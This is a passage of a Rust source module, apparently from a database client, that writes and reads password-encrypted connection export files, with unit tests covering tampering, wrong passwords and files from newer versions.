//! `.tablerconnections` files: "Export Connections ▸ …" writes saved connections (and, on request,
//! their passwords) to one; "Import Connections…" reads it back as new connections.
//!
//! The file is JSON. Without a file password it holds the connections in the clear (never any
//! secret). With a file password the whole payload (connections, groups and secrets) is sealed
//! with AES-256-GCM under a key derived from the password with PBKDF2-HMAC-SHA256; a wrong
//! password and a modified file both fail authentication.
//!
//! Groups are paths (`Clients / Acme / Prod`) with an optional icon id and an optional image (a
//! small `data:image/…` URI the user chose, TablePlus's group image). Version 1 files carried
//! plain group names; they still read (as top-level groups without an icon).
//!
//! Pure: no Tauri, app DB or Keychain access (see `commands::profiles` for those).

use std::collections::HashSet;
use std::num::NonZeroU32;

use aws_lc_rs::{aead, pbkdf2, rand};
use base64::Engine as _;
use base64::engine::general_purpose::STANDARD as B64;
use serde::{Deserialize, Deserializer, Serialize};
use serde_json::Value;
use uuid::Uuid;

use crate::error::AppError;
use crate::types::driver::ExtraSecret;
use crate::types::profile::{
    ConnectionProfile, Driver, ImportPreviewItem, PasswordMode, SkippedConnection,
};

/// `format` of every connections file.
pub const FORMAT: &str = "tabler-connections";
/// File layout version written by this build (also [`VERSION_NEW_DRIVERS`]; files of later
/// layouts are refused). Version 2 stores groups as `{ path, icon }` records; version 1 stored
/// plain names.
pub const VERSION: u32 = 2;
/// The version of a file holding a connection of a driver beyond PostgreSQL, MySQL and SQLite.
/// Same layout as [`VERSION`]: builds that fail on a driver they do not know (those from before
/// connections were read one by one) refuse it as newer, and this build reads it, skipping the
/// connections it cannot read.
pub const VERSION_NEW_DRIVERS: u32 = VERSION + 1;
/// The file name extension (without the dot).
pub const FILE_EXTENSION: &str = "tablerconnections";

/// PBKDF2-HMAC-SHA256 rounds for new files (OWASP's 2023 recommendation).
pub const PBKDF2_ITERATIONS: u32 = 600_000;
/// Below this, a file is refused: it was not written by Tabler (or was tampered with).
const MIN_ITERATIONS: u32 = 1_000;
/// Above this, a file is refused as corrupt: deriving its key would hang the import for minutes.
const MAX_ITERATIONS: u32 = 10_000_000;
const SALT_LEN: usize = 16;
const KEY_LEN: usize = 32;
const KDF: &str = "pbkdf2-hmac-sha256";
const CIPHER: &str = "aes-256-gcm";
/// Bound to the ciphertext, so a sealed payload cannot be passed off as another kind of file.
/// A domain tag, not the layout version: it stays the same so version 1 files still open.
const AAD: &[u8] = b"tabler-connections/1";
/// Between the levels of a group path.
pub const GROUP_SEPARATOR: &str = " / ";
/// Longest icon id kept (ids are short kebab-case names such as `hard-drive`).
const MAX_ICON_LEN: usize = 40;
/// Longest group image kept: its whole `data:image/…` URI, in characters (the renderer draws a
/// 64x64 PNG, a few KB; this leaves room for a busy one and keeps the settings and the files
/// small). Mirrors `MAX_GROUP_IMAGE_CHARS` in the renderer's `groups.ts`.
pub const MAX_IMAGE_LEN: usize = 24 * 1024;

/// Secrets of one exported connection; absent fields were not exported (or not stored).
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", default)]
pub struct ExportedSecrets {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub password: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ssh_password: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ssh_passphrase: Option<String>,
    /// The driver's second secrets (see `DriverDescriptor::extra_secrets`), exported with the
    /// passwords.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub key_passphrase: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub session_token: Option<String>,
}

impl ExportedSecrets {
    pub fn is_empty(&self) -> bool {
        self.password.is_none()
            && self.ssh_password.is_none()
            && self.ssh_passphrase.is_none()
            && self.key_passphrase.is_none()
            && self.session_token.is_none()
    }

    pub fn has_ssh(&self) -> bool {
        self.ssh_password.is_some() || self.ssh_passphrase.is_some()
    }

    pub fn extra(&self, extra: ExtraSecret) -> Option<&str> {
        match extra {
            ExtraSecret::KeyPassphrase => self.key_passphrase.as_deref(),
            ExtraSecret::SessionToken => self.session_token.as_deref(),
        }
    }

    pub fn extra_mut(&mut self, extra: ExtraSecret) -> &mut Option<String> {
        match extra {
            ExtraSecret::KeyPassphrase => &mut self.key_passphrase,
            ExtraSecret::SessionToken => &mut self.session_token,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ExportedConnection {
    pub profile: ConnectionProfile,
    #[serde(default, skip_serializing_if = "ExportedSecrets::is_empty")]
    pub secrets: ExportedSecrets,
}

/// A connection group, as saved in the `connectionGroups` setting and in files: its path (levels
/// joined by `GROUP_SEPARATOR`), the id of its icon (`None`: the plain folder) and the image the
/// user chose for it (a `data:image/…` URI; it takes the place of the icon on the header).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct GroupRecord {
    pub path: String,
    #[serde(default)]
    pub icon: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub image: Option<String>,
}

/// What a file carries: the connections and the groups (empty groups included).
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", from = "RawPayload")]
pub struct Payload {
    pub groups: Vec<GroupRecord>,
    pub connections: Vec<ExportedConnection>,
    /// The file's connections this build cannot read (a newer Tabler wrote them): listed by the
    /// preview, never imported, never written.
    #[serde(skip)]
    pub skipped: Vec<SkippedConnection>,
}

impl Payload {
    fn has_secrets(&self) -> bool {
        self.connections.iter().any(|c| !c.secrets.is_empty())
    }

    /// The paths of the file's groups, in file order.
    pub fn group_paths(&self) -> Vec<String> {
        self.groups.iter().map(|g| g.path.clone()).collect()
    }

    /// The layout version the file is written with (see [`VERSION_NEW_DRIVERS`]).
    fn version(&self) -> u32 {
        if self.connections.iter().all(|c| c.profile.driver.is_core()) {
            VERSION
        } else {
            VERSION_NEW_DRIVERS
        }
    }
}

/// A payload as read: each connection is decoded on its own, so one this build cannot read is
/// skipped instead of failing the whole file.
#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct RawPayload {
    #[serde(default, deserialize_with = "groups_of_any_version")]
    groups: Vec<GroupRecord>,
    connections: Vec<Value>,
}

impl From<RawPayload> for Payload {
    fn from(raw: RawPayload) -> Payload {
        let mut connections = Vec::new();
        let mut skipped = Vec::new();
        for value in &raw.connections {
            match ExportedConnection::deserialize(value) {
                Ok(c) => connections.push(c),
                Err(e) => skipped.push(skipped_connection(&value["profile"], &e)),
            }
        }
        Payload {
            groups: raw.groups,
            connections,
            skipped,
        }
    }
}

/// What the preview says about a connection this build cannot read: its name, and its driver
/// when that is what this build lacks.
fn skipped_connection(profile: &Value, e: &serde_json::Error) -> SkippedConnection {
    let name = profile.get("name").and_then(Value::as_str);
    let driver = profile.get("driver").and_then(Value::as_str);
    let known = |d: &str| Driver::deserialize(&Value::String(d.into())).is_ok();
    let reason = match driver {
        Some(d) if !known(d) => {
            format!("uses the {d} driver, which this version of Tabler does not have")
        }
        _ => format!("was saved by a newer version of Tabler ({e})"),
    };
    SkippedConnection {
        name: name.unwrap_or_default().to_string(),
        reason,
    }
}

fn groups_of_any_version<'de, D: Deserializer<'de>>(d: D) -> Result<Vec<GroupRecord>, D::Error> {
    Ok(parse_groups(&Value::deserialize(d)?))
}

/// A group path in its canonical form: a `/` with white space on either side separates levels
/// (so `CI/CD` stays one name), each level trimmed, empty levels dropped, joined with
/// `GROUP_SEPARATOR`. Blank input gives "" (no group). Mirrors `normalizePath` in the renderer.
pub fn normalize_group_path(raw: &str) -> String {
    let chars: Vec<char> = raw.chars().collect();
    let mut levels = Vec::new();
    let mut current = String::new();
    for (i, &c) in chars.iter().enumerate() {
        let separates = c == '/'
            && ((i > 0 && chars[i - 1].is_whitespace())
                || chars.get(i + 1).is_some_and(|n| n.is_whitespace()));
        if separates {
            levels.push(std::mem::take(&mut current));
        } else {
            current.push(c);
        }
    }
    levels.push(current);
    levels
        .iter()
        .map(|l| l.trim())
        .filter(|l| !l.is_empty())
        .collect::<Vec<_>>()
        .join(GROUP_SEPARATOR)
}

/// The ancestors of a (canonical, non-empty) path, outermost first, then the path itself.
fn with_ancestors(path: &str) -> Vec<String> {
    let levels: Vec<&str> = path.split(GROUP_SEPARATOR).collect();
    (1..=levels.len())
        .map(|n| levels[..n].join(GROUP_SEPARATOR))
        .collect()
}

fn icon_id(raw: Option<&str>) -> Option<String> {
    let id = raw?.trim();
    let valid = !id.is_empty()
        && id.len() <= MAX_ICON_LEN
        && id
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-');
    valid.then(|| id.to_string())
}

/// A group image as kept: the trimmed `data:image/…` URI, when it is one and fits
/// [`MAX_IMAGE_LEN`]. Anything else (a `javascript:` or `http:` URL, an oversize picture) is
/// dropped: the group keeps its icon.
pub fn image_uri(raw: Option<&str>) -> Option<String> {
    let uri = raw?.trim();
    (uri.len() <= MAX_IMAGE_LEN
        && uri.len() > "data:image/".len()
        && uri.starts_with("data:image/")
        && !uri.chars().any(char::is_control))
    .then(|| uri.to_string())
}

/// What a group looks like: its icon and its image (either may be missing).
type Look = (Option<String>, Option<String>);

/// Adds `path` (unless blank or already there; an existing group takes the `icon` / `image` it
/// lacks).
fn add_group(out: &mut Vec<GroupRecord>, path: &str, (icon, image): Look) {
    if path.is_empty() {
        return;
    }
    match out.iter_mut().find(|g| g.path == path) {
        Some(existing) => {
            if existing.icon.is_none() {
                existing.icon = icon;
            }
            if existing.image.is_none() {
                existing.image = image;
            }
        }
        None => out.push(GroupRecord {
            path: path.to_string(),
            icon,
            image,
        }),
    }
}

/// Reads saved or exported groups: records (`{ path, icon }`) or, from version 1, plain names.
/// Anything else is skipped; paths are made canonical and kept once (first one wins).
pub fn parse_groups(value: &Value) -> Vec<GroupRecord> {
    let mut out = Vec::new();
    for item in value.as_array().map(Vec::as_slice).unwrap_or_default() {
        let (raw, look) = match item {
            Value::String(name) => (name.as_str(), (None, None)),
            Value::Object(o) => match o.get("path").and_then(Value::as_str) {
                Some(path) => (
                    path,
                    (
                        icon_id(o.get("icon").and_then(Value::as_str)),
                        image_uri(o.get("image").and_then(Value::as_str)),
                    ),
                ),
                None => continue,
            },
            _ => continue,
        };
        add_group(&mut out, &normalize_group_path(raw), look);
    }
    out
}

fn look_in(groups: &[GroupRecord], path: &str) -> Look {
    groups
        .iter()
        .find(|g| g.path == path)
        .map(|g| (g.icon.clone(), g.image.clone()))
        .unwrap_or_default()
}

/// The groups an export writes: the `requested` ones (empty groups included) and those the
/// exported connections `used`, each with its ancestors so the tree survives, with the icons and
/// images saved in `stored`.
pub fn export_groups(
    stored: &[GroupRecord],
    requested: &[String],
    used: &[String],
) -> Vec<GroupRecord> {
    let mut out = Vec::new();
    for raw in requested.iter().chain(used) {
        let path = normalize_group_path(raw);
        if path.is_empty() {
            continue;
        }
        for p in with_ancestors(&path) {
            let look = look_in(stored, &p);
            add_group(&mut out, &p, look);
        }
    }
    out
}

/// The saved groups after an import: `known` (order, icons and images kept), plus the groups of
/// the imported connections (`used`) and, when the whole file was imported, every group of the
/// file (empty ones too), with their ancestors. Groups are matched by path; a new group, or a
/// known one without an icon (or an image), takes the file's.
pub fn merge_imported_groups(
    known: &[GroupRecord],
    file: &[GroupRecord],
    used: &[String],
    everything: bool,
) -> Vec<GroupRecord> {
    let mut out = known.to_vec();
    let from_file = file.iter().filter(|_| everything).map(|g| &g.path);
    for raw in used.iter().chain(from_file) {
        let path = normalize_group_path(raw);
        if path.is_empty() {
            continue;
        }
        for p in with_ancestors(&path) {
            let look = look_in(file, &p);
            add_group(&mut out, &p, look);
        }
    }
    out
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct Envelope {
    format: String,
    version: u32,
    #[serde(default)]
    exported_at: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    payload: Option<Payload>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    encrypted: Option<Sealed>,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct Sealed {
    kdf: String,
    iterations: u32,
    salt: String,
    cipher: String,
    nonce: String,
    data: String,
}

/// Outcome of reading a file.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ReadOutcome {
    /// The file is encrypted and no password was given.
    NeedsPassword,
    Opened {
        payload: Payload,
        encrypted: bool,
    },
}

fn derive_key(password: &str, salt: &[u8], iterations: u32) -> Result<aead::LessSafeKey, AppError> {
    let rounds = NonZeroU32::new(iterations)
        .ok_or_else(|| AppError::InvalidInput("invalid key derivation settings".into()))?;
    let mut key = [0u8; KEY_LEN];
    pbkdf2::derive(
        pbkdf2::PBKDF2_HMAC_SHA256,
        rounds,
        salt,
        password.as_bytes(),
        &mut key,
    );
    let unbound = aead::UnboundKey::new(&aead::AES_256_GCM, &key)
        .map_err(|_| AppError::Internal("cannot set up AES-256-GCM".into()))?;
    Ok(aead::LessSafeKey::new(unbound))
}

fn random<const N: usize>() -> Result<[u8; N], AppError> {
    let mut out = [0u8; N];
    rand::fill(&mut out).map_err(|_| AppError::Internal("no secure random numbers".into()))?;
    Ok(out)
}

/// Serialises `payload` as a connections file. Secrets need a `password`; with one the payload is
/// encrypted. An empty password counts as none.
pub fn write(
    payload: &Payload,
    password: Option<&str>,
    exported_at: &str,
) -> Result<Vec<u8>, AppError> {
    write_with_iterations(payload, password, exported_at, PBKDF2_ITERATIONS)
}

fn write_with_iterations(
    payload: &Payload,
    password: Option<&str>,
    exported_at: &str,
    iterations: u32,
) -> Result<Vec<u8>, AppError> {
    let password = password.filter(|p| !p.is_empty());
    let mut envelope = Envelope {
        format: FORMAT.into(),
        version: payload.version(),
        exported_at: exported_at.into(),
        payload: None,
        encrypted: None,
    };
    match password {
        None if payload.has_secrets() => {
            return Err(AppError::InvalidInput(
                "Set a file password to export passwords and passphrases".into(),
            ));
        }
        None => envelope.payload = Some(payload.clone()),
        Some(password) => {
            let salt: [u8; SALT_LEN] = random()?;
            let nonce: [u8; aead::NONCE_LEN] = random()?;
            let key = derive_key(password, &salt, iterations)?;
            let mut data = serde_json::to_vec(payload)?;
            key.seal_in_place_append_tag(
                aead::Nonce::assume_unique_for_key(nonce),
                aead::Aad::from(AAD),
                &mut data,
            )
            .map_err(|_| AppError::Internal("encryption failed".into()))?;
            envelope.encrypted = Some(Sealed {
                kdf: KDF.into(),
                iterations,
                salt: B64.encode(salt),
                cipher: CIPHER.into(),
                nonce: B64.encode(nonce),
                data: B64.encode(&data),
            });
        }
    }
    let mut out = serde_json::to_vec_pretty(&envelope)?;
    out.push(b'\n');
    Ok(out)
}

fn not_a_file() -> AppError {
    AppError::InvalidInput("This is not a Tabler connections file".into())
}

fn wrong_password() -> AppError {
    AppError::InvalidInput("The file password is wrong, or the file was modified".into())
}

/// Reads a connections file. An encrypted file needs `password` (an empty one counts as none).
pub fn read(bytes: &[u8], password: Option<&str>) -> Result<ReadOutcome, AppError> {
    let envelope: Envelope = serde_json::from_slice(bytes).map_err(|_| not_a_file())?;
    if envelope.format != FORMAT {
        return Err(not_a_file());
    }
    if envelope.version > VERSION_NEW_DRIVERS {
        return Err(AppError::InvalidInput(
            "This connections file was made by a newer version of Tabler".into(),
        ));
    }
    let sealed = match (envelope.payload, envelope.encrypted) {
        (Some(payload), None) => {
            return Ok(ReadOutcome::Opened {
                payload,
                encrypted: false,
            });
        }
        (None, Some(sealed)) => sealed,
        _ => return Err(not_a_file()),
    };
    let Some(password) = password.filter(|p| !p.is_empty()) else {
        return Ok(ReadOutcome::NeedsPassword);
    };
    if sealed.kdf != KDF || sealed.cipher != CIPHER || sealed.iterations < MIN_ITERATIONS {
        return Err(AppError::InvalidInput(
            "This connections file uses an unsupported encryption".into(),
        ));
    }
    if sealed.iterations > MAX_ITERATIONS {
        return Err(not_a_file());
    }
    let salt = B64.decode(&sealed.salt).map_err(|_| not_a_file())?;
    let nonce: [u8; aead::NONCE_LEN] = B64
        .decode(&sealed.nonce)
        .ok()
        .and_then(|n| n.try_into().ok())
        .ok_or_else(not_a_file)?;
    let mut data = B64.decode(&sealed.data).map_err(|_| not_a_file())?;
    let key = derive_key(password, &salt, sealed.iterations)?;
    let plain = key
        .open_in_place(
            aead::Nonce::assume_unique_for_key(nonce),
            aead::Aad::from(AAD),
            &mut data,
        )
        .map_err(|_| wrong_password())?;
    let payload: Payload = serde_json::from_slice(plain).map_err(|_| not_a_file())?;
    Ok(ReadOutcome::Opened {
        payload,
        encrypted: true,
    })
}

/// The import preview: every connection of the file, with a note when its name is taken.
pub fn preview(payload: &Payload, existing: &[ConnectionProfile]) -> Vec<ImportPreviewItem> {
    let names: HashSet<String> = existing.iter().map(|p| name_key(&p.name)).collect();
    payload
        .connections
        .iter()
        .map(|c| ImportPreviewItem {
            profile: c.profile.clone(),
            duplicate_name: names.contains(&name_key(&c.profile.name)),
            has_password: c.secrets.password.is_some(),
            has_ssh_secrets: c.secrets.has_ssh(),
        })
        .collect()
}

fn name_key(name: &str) -> String {
    name.trim().to_lowercase()
}

/// Takes the password command out of a profile: one that got its password from it ("Command
/// Line (IAM authentication)") asks for it on every connect instead. The command runs through the
/// user's shell on every connect, so it is treated like a secret: exported only with the
/// passwords, imported only when the user chose to keep it after seeing it.
pub fn drop_password_command(profile: &mut ConnectionProfile) {
    profile.options.password_command = None;
    if profile.options.password_mode == Some(PasswordMode::Command) {
        profile.options.password_mode = Some(PasswordMode::Ask);
    }
}

/// The connections chosen for import (by their id in the file), as new profiles: fresh ids,
/// appended to the list (sort order 0 lets the app DB put them last), never connected. Secrets
/// the profile cannot use (an SSH secret without SSH, a second secret its driver does not take)
/// are dropped, and so is every password
/// command except those of `keep_commands` (ids in the file), which the user saw in the preview
/// and chose to keep (see [`drop_password_command`]).
pub fn plan_import(
    payload: &Payload,
    selected: &[Uuid],
    keep_commands: &[Uuid],
) -> Vec<(ConnectionProfile, ExportedSecrets)> {
    let wanted: HashSet<Uuid> = selected.iter().copied().collect();
    payload
        .connections
        .iter()
        .filter(|c| wanted.contains(&c.profile.id))
        .map(|c| {
            let mut profile = c.profile.clone();
            if !keep_commands.contains(&profile.id) || profile.options.password_command().is_none()
            {
                drop_password_command(&mut profile);
            }
            profile.id = Uuid::new_v4();
            profile.sort_order = 0;
            profile.created_at = String::new();
            profile.updated_at = String::new();
            profile.last_connected_at = None;
            let mut secrets = c.secrets.clone();
            if profile.ssh.is_none() {
                secrets.ssh_password = None;
                secrets.ssh_passphrase = None;
            }
            // Only the second secrets the profile's driver takes.
            let takes = profile.driver.descriptor().extra_secrets;
            for extra in [ExtraSecret::KeyPassphrase, ExtraSecret::SessionToken] {
                if !takes.contains(&extra) {
                    *secrets.extra_mut(extra) = None;
                }
            }
            (profile, secrets)
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::profile::{
        ConnectionTag, Driver, ProfileOptions, SafeModeLevel, SshAuth, SshConfig, SslMode,
    };

    const FAST: u32 = MIN_ITERATIONS;

    fn profile(name: &str, ssh: bool) -> ConnectionProfile {
        ConnectionProfile {
            id: Uuid::new_v4(),
            name: name.into(),
            color: Some("purple".into()),
            group: Some("Staging".into()),
            driver: Driver::Postgres,
            host: Some("10.0.1.20".into()),
            port: Some(5432),
            user: Some("app".into()),
            database: Some("app_staging".into()),
            ssl: SslMode::VerifyFull,
            ssl_ca_path: Some("/etc/ca.pem".into()),
            sqlite_path: None,
            ssh: ssh.then(|| SshConfig {
                host: "bastion.example.com".into(),
                port: 22,
                user: "deploy".into(),
                auth: SshAuth::Password,
                key_path: None,
                local_port: Some(15432),
                keepalive_secs: Some(20),
                password_mode: None,
            }),
            options: ProfileOptions {
                tag: Some(ConnectionTag::Staging),
                safe_mode: Some(SafeModeLevel::AlertNonSelect),
                startup_sql: Some("SET search_path = app".into()),
                ..ProfileOptions::default()
            },
            sort_order: 7,
            created_at: "2026-01-01T00:00:00Z".into(),
            updated_at: "2026-01-02T00:00:00Z".into(),
            last_connected_at: Some("2026-01-03T00:00:00Z".into()),
        }
    }

    fn group(path: &str, icon: Option<&str>) -> GroupRecord {
        GroupRecord {
            path: path.into(),
            icon: icon.map(str::to_string),
            image: None,
        }
    }

    const PNG: &str = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGNgYGD4DwABBAEAwS2OUAAAAABJRU5ErkJggg==";

    fn pictured(path: &str, icon: Option<&str>, image: &str) -> GroupRecord {
        GroupRecord {
            image: Some(image.into()),
            ..group(path, icon)
        }
    }

    fn payload() -> Payload {
        Payload {
            groups: vec![
                group("Staging", Some("server")),
                group("Staging / Empty", None),
            ],
            connections: vec![
                ExportedConnection {
                    profile: profile("Staging", true),
                    secrets: ExportedSecrets {
                        password: Some("db-pw".into()),
                        ssh_password: Some("ssh-pw".into()),
                        ..ExportedSecrets::default()
                    },
                },
                ExportedConnection {
                    profile: profile("Reporting", false),
                    secrets: ExportedSecrets::default(),
                },
            ],
            skipped: Vec::new(),
        }
    }

    #[test]
    fn encrypted_round_trip_keeps_every_field_and_secret() {
        let p = payload();
        let bytes = write_with_iterations(&p, Some("file pw"), "now", FAST).unwrap();
        let text = String::from_utf8(bytes.clone()).unwrap();
        // Nothing readable leaks: no secret, no host, no name.
        for needle in ["db-pw", "ssh-pw", "10.0.1.20", "Reporting", "bastion"] {
            assert!(!text.contains(needle), "{needle} leaked");
        }
        assert!(text.contains("\"format\": \"tabler-connections\""));
        assert_eq!(read(&bytes, None).unwrap(), ReadOutcome::NeedsPassword);
        assert_eq!(read(&bytes, Some("")).unwrap(), ReadOutcome::NeedsPassword);
        assert_eq!(
            read(&bytes, Some("file pw")).unwrap(),
            ReadOutcome::Opened {
                payload: p,
                encrypted: true
            }
        );
    }

    #[test]
    fn plain_files_never_carry_secrets() {
        let mut p = payload();
        let err = write_with_iterations(&p, None, "now", FAST).unwrap_err();
        assert_eq!(err.code(), "INVALID_INPUT");
        assert!(err.to_string().contains("file password"), "{err}");
        for c in &mut p.connections {
            c.secrets = ExportedSecrets::default();
        }
        let bytes = write_with_iterations(&p, Some(""), "now", FAST).unwrap();
        let text = String::from_utf8(bytes.clone()).unwrap();
        assert!(text.contains("Reporting") && !text.contains("secrets"));
        assert_eq!(
            read(&bytes, Some("ignored")).unwrap(),
            ReadOutcome::Opened {
                payload: p,
                encrypted: false
            }
        );
    }

    #[test]
    fn wrong_password_is_refused() {
        let bytes = write_with_iterations(&payload(), Some("right"), "now", FAST).unwrap();
        let err = read(&bytes, Some("wrong")).unwrap_err();
        assert_eq!(err.code(), "INVALID_INPUT");
        assert!(err.to_string().contains("password is wrong"), "{err}");
    }

    #[test]
    fn tampered_files_are_refused() {
        let bytes = write_with_iterations(&payload(), Some("pw"), "now", FAST).unwrap();
        let mut envelope: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
        let sealed = envelope["encrypted"].clone();

        // One flipped bit in the ciphertext.
        let mut data = B64.decode(sealed["data"].as_str().unwrap()).unwrap();
        data[3] ^= 0x01;
        envelope["encrypted"]["data"] = B64.encode(&data).into();
        let tampered = serde_json::to_vec(&envelope).unwrap();
        assert!(
            read(&tampered, Some("pw"))
                .unwrap_err()
                .to_string()
                .contains("modified")
        );

        // A swapped nonce or salt fails the same way.
        let mut envelope: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
        envelope["encrypted"]["nonce"] = B64.encode([7u8; aead::NONCE_LEN]).into();
        assert!(read(&serde_json::to_vec(&envelope).unwrap(), Some("pw")).is_err());
        let mut envelope: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
        envelope["encrypted"]["salt"] = B64.encode([9u8; SALT_LEN]).into();
        assert!(read(&serde_json::to_vec(&envelope).unwrap(), Some("pw")).is_err());

        // Lowered key-derivation cost is refused before decrypting.
        let mut envelope: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
        envelope["encrypted"]["iterations"] = 1.into();
        let err = read(&serde_json::to_vec(&envelope).unwrap(), Some("pw")).unwrap_err();
        assert!(err.to_string().contains("unsupported"), "{err}");

        // So is a cost that would hang the import (u32::MAX rounds): refused without deriving.
        envelope["encrypted"]["iterations"] = u32::MAX.into();
        let started = std::time::Instant::now();
        let err = read(&serde_json::to_vec(&envelope).unwrap(), Some("pw")).unwrap_err();
        assert!(
            err.to_string().contains("not a Tabler connections file"),
            "{err}"
        );
        assert!(started.elapsed() < std::time::Duration::from_secs(5));
        envelope["encrypted"]["iterations"] = (MAX_ITERATIONS + 1).into();
        assert!(read(&serde_json::to_vec(&envelope).unwrap(), Some("pw")).is_err());
    }

    #[test]
    fn other_files_are_refused() {
        for bytes in [
            &b"not json"[..],
            br#"{"format":"tableplus","version":1,"payload":{"connections":[]}}"#,
            br#"{"format":"tabler-connections","version":1}"#,
        ] {
            assert!(
                read(bytes, None)
                    .unwrap_err()
                    .to_string()
                    .contains("not a Tabler connections file")
            );
        }
        let newer = br#"{"format":"tabler-connections","version":99,"payload":{"connections":[]}}"#;
        assert!(read(newer, None).unwrap_err().to_string().contains("newer"));
    }

    /// A file a newer Tabler wrote: the connections this build cannot read (a driver or an option
    /// value it does not know) are listed as skipped, the others import with the option keys this
    /// build does not know.
    #[test]
    fn a_file_with_unknown_connections_imports_the_rest() {
        let known = profile("Staging", false);
        let mut known_json = serde_json::to_value(&known).unwrap();
        known_json["options"]["futureOption"] = serde_json::json!({ "on": true });
        let unknown_driver = profile("Analytics", false);
        let mut unknown_driver_json = serde_json::to_value(&unknown_driver).unwrap();
        unknown_driver_json["driver"] = "futuredb".into();
        let mut unknown_value = serde_json::to_value(profile("Odd", false)).unwrap();
        unknown_value["options"]["safeMode"] = "futureLevel".into();
        let file = serde_json::json!({
            "format": FORMAT,
            "version": VERSION_NEW_DRIVERS,
            "payload": {
                "groups": [{ "path": "Staging", "icon": "server" }],
                "connections": [
                    { "profile": unknown_driver_json },
                    { "profile": known_json, "secrets": { "password": "pw" } },
                    { "profile": unknown_value },
                    42,
                ],
            },
        });
        let ReadOutcome::Opened { payload, .. } =
            read(&serde_json::to_vec(&file).unwrap(), None).unwrap()
        else {
            panic!("a plain file opens without a password");
        };
        // The sealed payload of an encrypted file decodes the same way.
        assert_eq!(
            serde_json::from_value::<Payload>(file["payload"].clone()).unwrap(),
            payload
        );
        assert_eq!(payload.groups, [group("Staging", Some("server"))]);
        assert_eq!(payload.connections.len(), 1);
        let only = &payload.connections[0];
        assert_eq!(only.profile.name, "Staging");
        assert_eq!(only.secrets.password.as_deref(), Some("pw"));
        assert_eq!(
            only.profile.options.unknown["futureOption"],
            serde_json::json!({ "on": true })
        );
        let names: Vec<&str> = payload.skipped.iter().map(|s| s.name.as_str()).collect();
        assert_eq!(names, ["Analytics", "Odd", ""]);
        let reasons: Vec<&str> = payload.skipped.iter().map(|s| s.reason.as_str()).collect();
        assert_eq!(
            reasons[0],
            "uses the futuredb driver, which this version of Tabler does not have"
        );
        assert!(reasons[1].starts_with("was saved by a newer version of Tabler ("));
        assert!(reasons[1].contains("futureLevel"), "{}", reasons[1]);
        assert!(reasons[2].starts_with("was saved by a newer version of Tabler ("));

        // Only what can be read is previewed and imported, option keys and all.
        assert_eq!(preview(&payload, &[]).len(), 1);
        let planned = plan_import(&payload, &[unknown_driver.id, known.id], &[]);
        assert_eq!(planned.len(), 1);
        assert_eq!(planned[0].0.name, "Staging");
        assert_eq!(
            planned[0].0.options.unknown["futureOption"],
            serde_json::json!({ "on": true })
        );

        // Exported again by this build, the keys travel on (sealed too); the skipped ones do not.
        let bytes = write_with_iterations(&payload, Some("file pw"), "now", FAST).unwrap();
        let ReadOutcome::Opened { payload: back, .. } = read(&bytes, Some("file pw")).unwrap()
        else {
            panic!("the password opens it");
        };
        assert_eq!(back.connections, payload.connections);
        assert!(back.skipped.is_empty());
    }

    #[test]
    fn files_for_new_drivers_read_and_later_layouts_are_refused() {
        // Only PostgreSQL, MySQL and SQLite: the version every build reads.
        assert_eq!(payload().version(), VERSION);
        let file = |version: u32| {
            format!(r#"{{"format":"{FORMAT}","version":{version},"payload":{{"connections":[]}}}}"#)
        };
        assert!(read(file(VERSION_NEW_DRIVERS).as_bytes(), None).is_ok());
        let err = read(file(VERSION_NEW_DRIVERS + 1).as_bytes(), None).unwrap_err();
        assert!(err.to_string().contains("newer version"), "{err}");
    }

    #[test]
    fn a_file_with_another_driver_is_written_with_the_newer_version() {
        let mut p = payload();
        for c in &mut p.connections {
            c.secrets = ExportedSecrets::default();
        }
        p.connections[1].profile.driver = Driver::Redis;
        assert_eq!(p.version(), VERSION_NEW_DRIVERS);
        let bytes = write_with_iterations(&p, None, "now", FAST).unwrap();
        let envelope: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
        assert_eq!(envelope["version"], VERSION_NEW_DRIVERS);
        assert_eq!(
            envelope["payload"]["connections"][1]["profile"]["driver"],
            "redis"
        );
        // This build reads it back whole.
        let ReadOutcome::Opened { payload: back, .. } = read(&bytes, None).unwrap() else {
            panic!("a plain file opens");
        };
        assert_eq!(back.connections, p.connections);
        assert!(back.skipped.is_empty());
    }

    #[test]
    fn the_production_cost_round_trips() {
        let p = payload();
        let bytes = write(&p, Some("pw"), "now").unwrap();
        let envelope: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
        assert_eq!(envelope["encrypted"]["iterations"], PBKDF2_ITERATIONS);
        assert_eq!(envelope["encrypted"]["cipher"], CIPHER);
        assert!(matches!(
            read(&bytes, Some("pw")).unwrap(),
            ReadOutcome::Opened { .. }
        ));
    }

    #[test]
    fn preview_flags_duplicates_and_secrets() {
        let p = payload();
        let mut existing = profile("  staging ", false);
        existing.id = Uuid::new_v4();
        let items = preview(&p, &[existing]);
